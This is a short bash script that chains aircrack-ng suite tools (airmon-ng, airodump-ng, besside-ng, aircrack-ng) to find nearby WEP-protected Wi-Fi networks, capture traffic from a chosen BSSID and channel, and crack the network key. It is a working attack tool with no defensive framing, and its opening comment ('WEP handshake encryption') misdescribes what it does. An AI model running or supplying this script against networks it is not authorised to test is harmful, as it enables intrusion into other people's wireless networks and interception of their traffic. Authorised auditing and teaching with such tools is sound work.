#!/bin/bash

# WEP handshake encryption
red="\e[0;91m"
blue="\e[0;94m"
reset="\e[0m"
echo ' '

read -p "[$(echo -e $blue"?"$reset)] Enter name interface : " Interface

airmon-ng start $Interface

MON=mon
airodump-ng $Interface$MON --encrypt WEP

read -p "[$(echo -e $blue"?"$reset)] Enter BSSID : " BSSID
read -p "[$(echo -e $blue"?"$reset)] Enter CHANNL : " CHANNL

besside-ng $Interface$MON -c $CHANNL -b $BSSID

aircrack-ng ./wep.cap

airmon-ng stop $Interface$MON